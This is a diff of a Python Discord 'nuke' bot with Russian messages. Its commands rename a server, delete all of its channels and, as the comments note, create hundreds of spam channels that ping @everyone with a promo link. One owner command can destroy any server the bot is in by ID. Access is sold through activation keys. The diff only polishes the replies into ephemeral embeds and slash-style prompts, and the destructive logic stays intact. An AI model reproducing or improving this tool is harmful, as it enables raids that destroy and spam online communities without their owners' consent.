@@ -36,20 +36,29 @@ async def on_ready():
     print(f'✅ {bot.user} готов')
     await bot.change_presence(activity=discord.Game(name="-dszlip"))
 
+# ── ВСПОМОГАТЕЛЬНАЯ ФУНКЦИЯ ДЛЯ ЭФЕМЕРНЫХ СООБЩЕНИЙ ──
+async def send_ephemeral(ctx, embed):
+    await ctx.send(embed=embed, ephemeral=True)
+
 # ── КОМАНДЫ ──
 @bot.command()
 async def dszlip(ctx):
     if not has_key(ctx.author.id) and not is_owner(ctx):
         embed = discord.Embed(
             title="ДОСТУП ЗАПРЕЩЁН",
-            description="У вас нет активного ключа.\nИспользуйте `-key` для активации.",
+            description="У вас нет активного ключа.\nИспользуйте `/key` для активации.",
             color=0x2f3136
         )
-        await ctx.send(embed=embed)
+        await ctx.send(embed=embed, ephemeral=True)
         return
 
     if not ctx.author.guild_permissions.administrator:
-        await ctx.send("❌ Нужны права администратора!")
+        embed = discord.Embed(
+            title="ОШИБКА",
+            description="Требуются права администратора.",
+            color=0x2f3136
+        )
+        await ctx.send(embed=embed, ephemeral=True)
         return
 
     await ctx.send("**НАЧАЛО НЮКА**")
@@ -57,17 +66,14 @@ async def dszlip(ctx):
     guild = ctx.guild
     start_time = time.time()
     
-    # Меняем название
     await guild.edit(name="MOGGED BY ZLIP")
     
-    # Удаляем каналы
     for channel in guild.channels:
         try:
             await channel.delete()
         except:
             pass
     
-    # Создаём 500 каналов со спамом
     SPAM = """@everyone
 MOGGED BY ZLIP
 https://guns.lol/dszlip
@@ -94,51 +100,81 @@ https://guns.lol/dszlip
 async def key(ctx):
     embed = discord.Embed(
         title="АКТИВАЦИЯ КЛЮЧА",
-        description="Введите ключ командой:\n`-activate КЛЮЧ`",
+        description="Введите ключ командой:\n`/activate КЛЮЧ`",
         color=0x2f3136
     )
     embed.set_footer(text="Приобрести ключ: @dszlip")
-    await ctx.send(embed=embed)
+    await ctx.send(embed=embed, ephemeral=True)
 
 @bot.command()
 async def activate(ctx, *, key: str = None):
     if not key:
-        await ctx.send("❌ Использование: `-activate КЛЮЧ`")
+        embed = discord.Embed(
+            title="ОШИБКА",
+            description="Использование: `/activate КЛЮЧ`",
+            color=0x2f3136
+        )
+        await ctx.send(embed=embed, ephemeral=True)
         return
     
     if key in keys_data.values():
-        await ctx.send("❌ Этот ключ уже использован")
+        embed = discord.Embed(
+            title="ОШИБКА",
+            description="Этот ключ уже использован.",
+            color=0x2f3136
+        )
+        await ctx.send(embed=embed, ephemeral=True)
         return
     
-    # Проверяем ключ (можно добавить свою генерацию)
     if len(key) >= 8:
         keys_data[str(ctx.author.id)] = key
         save_keys(keys_data)
         
         embed = discord.Embed(
             title="КЛЮЧ АКТИВИРОВАН",
-            description="Доступ к боту получен!\nИспользуйте `-dszlip` для нюка.",
+            description="Доступ к боту получен.\nИспользуйте `/dszlip` для нюка.",
             color=0x2f3136
         )
-        await ctx.send(embed=embed)
+        await ctx.send(embed=embed, ephemeral=True)
     else:
-        await ctx.send("❌ Неверный ключ")
+        embed = discord.Embed(
+            title="ОШИБКА",
+            description="Неверный формат ключа.",
+            color=0x2f3136
+        )
+        await ctx.send(embed=embed, ephemeral=True)
 
 @bot.command()
 async def nuke(ctx, guild_id: int = None):
     if not is_owner(ctx):
+        embed = discord.Embed(
+            title="ДОСТУП ЗАПРЕЩЁН",
+            description="Только для владельца.",
+            color=0x2f3136
+        )
+        await ctx.send(embed=embed, ephemeral=True)
         return
     
     if not guild_id:
-        await ctx.send("❌ Использование: `-nuke ID_СЕРВЕРА`")
+        embed = discord.Embed(
+            title="ОШИБКА",
+            description="Использование: `/nuke ID_СЕРВЕРА`",
+            color=0x2f3136
+        )
+        await ctx.send(embed=embed, ephemeral=True)
         return
     
     guild = bot.get_guild(guild_id)
     if not guild:
-        await ctx.send(f"❌ Сервер с ID `{guild_id}` не найден")
+        embed = discord.Embed(
+            title="ОШИБКА",
+            description=f"Сервер с ID `{guild_id}` не найден.",
+            color=0x2f3136
+        )
+        await ctx.send(embed=embed, ephemeral=True)
         return
     
-    await ctx.send(f"🔥 НЮК СЕРВЕРА: **{guild.name}**")
+    await ctx.send(f"НЮК СЕРВЕРА: **{guild.name}**")
     
     await guild.edit(name="MOGGED BY ZLIP")
     for channel in guild.channels:
@@ -159,11 +195,22 @@ https://guns.lol/dszlip"""
         except:
             break
     
-    await ctx.send(f"✅ Сервер **{guild.name}** уничтожен")
+    embed = discord.Embed(
+        title="СЕРВЕР УНИЧТОЖЕН",
+        description=f"**{guild.name}**",
+        color=0x2f3136
+    )
+    await ctx.send(embed=embed)
 
 @bot.command()
 async def servers(ctx):
     if not is_owner(ctx):
+        embed = discord.Embed(
+            title="ДОСТУП ЗАПРЕЩЁН",
+            description="Только для владельца.",
+            color=0x2f3136
+        )
+        await ctx.send(embed=embed, ephemeral=True)
         return
     
     desc = ""
@@ -175,15 +222,26 @@ async def servers(ctx):
         description=desc or "Нет серверов",
         color=0x2f3136
     )
-    await ctx.send(embed=embed)
+    await ctx.send(embed=embed, ephemeral=True)
 
 @bot.command()
 async def genkey(ctx, user: discord.User = None):
     if not is_owner(ctx):
+        embed = discord.Embed(
+            title="ДОСТУП ЗАПРЕЩЁН",
+            description="Только для владельца.",
+            color=0x2f3136
+        )
+        await ctx.send(embed=embed, ephemeral=True)
         return
     
     if not user:
-        await ctx.send("❌ Использование: `-genkey @пользователь`")
+        embed = discord.Embed(
+            title="ОШИБКА",
+            description="Использование: `/genkey @пользователь`",
+            color=0x2f3136
+        )
+        await ctx.send(embed=embed, ephemeral=True)
         return
     
     key = f"ZLIP-{int(time.time())}-{user.id}"[:16]
@@ -195,32 +253,59 @@ async def genkey(ctx, user: discord.User = None):
         description=f"Пользователь: {user.mention}\nКлюч: `{key}`",
         color=0x2f3136
     )
-    await ctx.send(embed=embed)
+    await ctx.send(embed=embed, ephemeral=True)
     
     try:
-        await user.send(f"🔑 Ваш ключ: `{key}`\nИспользуйте `-activate {key}` для активации")
+        await user.send(f"КЛЮЧ АКТИВАЦИИ\n`{key}`\nИспользуйте `/activate {key}`")
     except:
         pass
 
 @bot.command()
 async def delkey(ctx, user: discord.User = None):
     if not is_owner(ctx):
+        embed = discord.Embed(
+            title="ДОСТУП ЗАПРЕЩЁН",
+            description="Только для владельца.",
+            color=0x2f3136
+        )
+        await ctx.send(embed=embed, ephemeral=True)
         return
     
     if not user:
-        await ctx.send("❌ Использование: `-delkey @пользователь`")
+        embed = discord.Embed(
+            title="ОШИБКА",
+            description="Использование: `/delkey @пользователь`",
+            color=0x2f3136
+        )
+        await ctx.send(embed=embed, ephemeral=True)
         return
     
     if str(user.id) in keys_data:
         del keys_data[str(user.id)]
         save_keys(keys_data)
-        await ctx.send(f"✅ Ключ у {user.mention} удалён")
+        embed = discord.Embed(
+            title="КЛЮЧ УДАЛЁН",
+            description=f"У {user.mention} ключ удалён.",
+            color=0x2f3136
+        )
+        await ctx.send(embed=embed, ephemeral=True)
     else:
-        await ctx.send(f"❌ У {user.mention} нет ключа")
+        embed = discord.Embed(
+            title="ОШИБКА",
+            description=f"У {user.mention} нет ключа.",
+            color=0x2f3136
+        )
+        await ctx.send(embed=embed, ephemeral=True)
 
 @bot.command()
 async def keys(ctx):
     if not is_owner(ctx):
+        embed = discord.Embed(
+            title="ДОСТУП ЗАПРЕЩЁН",
+            description="Только для владельца.",
+            color=0x2f3136
+        )
+        await ctx.send(embed=embed, ephemeral=True)
         return
     
     desc = ""
@@ -236,7 +321,7 @@ async def keys(ctx):
         description=desc or "Нет ключей",
         color=0x2f3136
     )
-    await ctx.send(embed=embed)
+    await ctx.send(embed=embed, ephemeral=True)
 
 import os
 bot.run(os.environ['TOKEN'])
